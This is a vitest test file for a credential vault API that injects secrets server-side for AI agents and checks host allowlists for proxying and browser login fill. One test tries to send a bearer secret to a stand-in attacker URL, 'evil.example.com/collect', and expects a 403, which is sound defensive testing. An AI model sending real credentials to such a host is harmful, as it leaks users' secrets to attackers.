// use_credential — the write-only-sink proxy (POST /v1/vault/use).
//
//  - allowlisted host → secret injected server-side, upstream response
//    returned, secret never in the response the agent receives
//  - OFF-allowlist host → 403 host_not_allowed (hard-enforced; the
//    secret can't be redirected to an attacker-chosen destination)
//  - service selector resolves; cross-account 404

import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { FastifyInstance } from "fastify";
import { issueAgentSession } from "../auth/agent.js";
import { issueSession, signSessionJwt, SESSION_COOKIE_NAME } from "../auth/session.js";
import { buildInMemoryDeps, type ApiDeps } from "../services/deps.js";
import { buildServer } from "../server.js";
import { HttpProxyExecutor } from "../services/http-proxy.js";

const SESSION_SECRET = "dev-test-secret-do-not-use-anywhere-else";
const CUSTOMER_ID = "ts-test";

interface Harness {
  server: FastifyInstance;
  deps: ApiDeps;
}

// Records the substituted request the executor saw (server-side only).
const seen: Array<{ url: string; auth: string | undefined }> = [];
function fakeExecutor(): HttpProxyExecutor {
  return new HttpProxyExecutor({
    lookup: async () => ({ address: "203.0.113.9", family: 4 }),
    dispatch: async (input) => {
      seen.push({ url: input.url.toString(), auth: input.headers.authorization });
      return {
        status: 200,
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ ok: true }),
        truncated: false,
      };
    },
  });
}

async function setup(): Promise<Harness> {
  const deps = buildInMemoryDeps({ sessionSecret: SESSION_SECRET});
  const server = await buildServer({ deps, proxyExecutor: fakeExecutor() });
  return { server, deps };
}

async function webCookie(deps: ApiDeps, accountId: string): Promise<string> {
  const { record, jwt } = issueSession({ account_id: accountId, ip: null, user_agent: null, now: new Date() });
  await deps.sessionStore.insert(record);
  return `${SESSION_COOKIE_NAME}=${signSessionJwt(jwt, SESSION_SECRET)}`;
}

async function agentToken(deps: ApiDeps, accountId: string): Promise<string> {
  const { raw_token, record } = issueAgentSession({
    account_id: accountId,
    agent_identity: "claude-code",
    agent_version: "test",
    now: new Date(),
  });
  await deps.agentSessionStore.insert(record);
  return raw_token;
}

async function storeCred(h: Harness, cookie: string, service: string): Promise<string> {
  const res = await h.server.inject({
    method: "POST",
    url: "/v1/vault/credentials/manual",
    headers: { cookie, "content-type": "application/json" },
    payload: { service, value: "sk-the-real-secret", type: "api_key" },
  });
  return (res.json() as { reference: string }).reference;
}

async function storeLoginCred(
  h: Harness,
  cookie: string,
  service: string,
  loginHosts: string[],
): Promise<string> {
  const res = await h.server.inject({
    method: "POST",
    url: "/v1/vault/credentials/manual",
    headers: { cookie, "content-type": "application/json" },
    payload: {
      service,
      fields: { login: "ada@example.test", password: "correct-horse" },
      type: "username_password",
      auth_strategy: "username_password",
      login_hosts: loginHosts,
    },
  });
  expect(res.statusCode).toBe(201);
  return (res.json() as { reference: string }).reference;
}

describe("POST /v1/vault/use", () => {
  let h: Harness;
  beforeEach(async () => {
    seen.length = 0;
    h = await setup();
  });
  afterEach(async () => {
    await h.server.close();
  });

  it("proxies to an allowlisted host; secret injected server-side, never returned to the agent", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    const reference = await storeCred(h, cookie, "OpenAI"); // → api.openai.com

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/use",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: {
        reference,
        http: {
          method: "GET",
          url: "https://api.openai.com/v1/models",
          headers: { authorization: "Bearer ${SECRET}" },
        },
      },
    });
    expect(res.statusCode).toBe(200);
    const body = res.json() as { response: { status: number; body: string } };
    expect(body.response.status).toBe(200);
    // Executor saw the substituted secret (server-side).
    expect(seen[0]!.auth).toBe("Bearer sk-the-real-secret");
    // The agent's response body does NOT contain the secret.
    expect(body.response.body).not.toContain("sk-the-real-secret");
  });

  it("HARD-REJECTS an off-allowlist host with 403 (no upstream dispatch)", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    const reference = await storeCred(h, cookie, "OpenAI"); // allowlist = [api.openai.com]

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/use",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: {
        reference,
        http: {
          method: "GET",
          url: "https://evil.example.com/collect",
          headers: { authorization: "Bearer ${SECRET}" },
        },
      },
    });
    expect(res.statusCode).toBe(403);
    expect((res.json() as { error: string }).error).toBe("host_not_allowed");
    // The executor was never invoked — secret never left the building.
    expect(seen).toHaveLength(0);
  });

  it("resolves by service name", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    await storeCred(h, cookie, "OpenAI");

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/use",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: {
        service: "openai",
        http: { method: "GET", url: "https://api.openai.com/v1/models", headers: { authorization: "Bearer ${SECRET}" } },
      },
    });
    expect(res.statusCode).toBe(200);
  });

  it("cannot use another account's credential", async () => {
    const a = await h.deps.accountStore.createAccount("a@example.test", "A");
    const b = await h.deps.accountStore.createAccount("b@example.test", "B");
    const cookieA = await webCookie(h.deps, a.id);
    const tokenB = await agentToken(h.deps, b.id);
    const refA = await storeCred(h, cookieA, "OpenAI");

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/use",
      headers: { authorization: `Bearer ${tokenB}`, "content-type": "application/json" },
      payload: { reference: refA, http: { method: "GET", url: "https://api.openai.com/v1/models", headers: {} } },
    });
    expect(res.statusCode).toBe(404);
  });

  it("rejects username_password credentials on the generic proxy", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    const reference = await storeLoginCred(h, cookie, "Example", ["app.example.com"]);

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/use",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: {
        reference,
        http: { method: "GET", url: "https://app.example.com/login", headers: {} },
      },
    });

    expect(res.statusCode).toBe(400);
    expect((res.json() as { error: string }).error).toBe("unsupported_credential_type");
    expect(seen).toHaveLength(0);
  });
});

describe("POST /v1/vault/browser-fill", () => {
  let h: Harness;
  beforeEach(async () => {
    seen.length = 0;
    h = await setup();
  });
  afterEach(async () => {
    await h.server.close();
  });

  it("returns requested login fields for an exact login host", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    const reference = await storeLoginCred(h, cookie, "Example", ["app.example.com"]);

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/browser-fill",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: {
        reference,
        current_host: "https://app.example.com/login",
        fields: ["login", "password"],
      },
    });

    expect(res.statusCode).toBe(200);
    expect(res.json()).toMatchObject({
      reference,
      fields: { login: "ada@example.test", password: "correct-horse" },
    });
  });

  it("does not let an exact login host match a subdomain", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    const reference = await storeLoginCred(h, cookie, "Example", ["example.com"]);

    const res = await h.server.inject({
      method: "POST",
      url: "/v1/vault/browser-fill",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: { reference, current_host: "api.example.com", fields: ["login"] },
    });

    expect(res.statusCode).toBe(403);
    expect((res.json() as { error: string }).error).toBe("login_host_not_allowed");
  });

  it("lets an explicit wildcard match subdomains but not the apex host", async () => {
    const account = await h.deps.accountStore.createAccount("u@example.test", "U");
    const cookie = await webCookie(h.deps, account.id);
    const token = await agentToken(h.deps, account.id);
    const reference = await storeLoginCred(h, cookie, "Example", ["*.example.com"]);

    const subdomain = await h.server.inject({
      method: "POST",
      url: "/v1/vault/browser-fill",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: { reference, current_host: "login.example.com", fields: ["login"] },
    });
    expect(subdomain.statusCode).toBe(200);
    expect(subdomain.json()).toMatchObject({ fields: { login: "ada@example.test" } });

    const apex = await h.server.inject({
      method: "POST",
      url: "/v1/vault/browser-fill",
      headers: { authorization: `Bearer ${token}`, "content-type": "application/json" },
      payload: { reference, current_host: "example.com", fields: ["login"] },
    });
    expect(apex.statusCode).toBe(403);
    expect((apex.json() as { error: string }).error).toBe("login_host_not_allowed");
  });
});
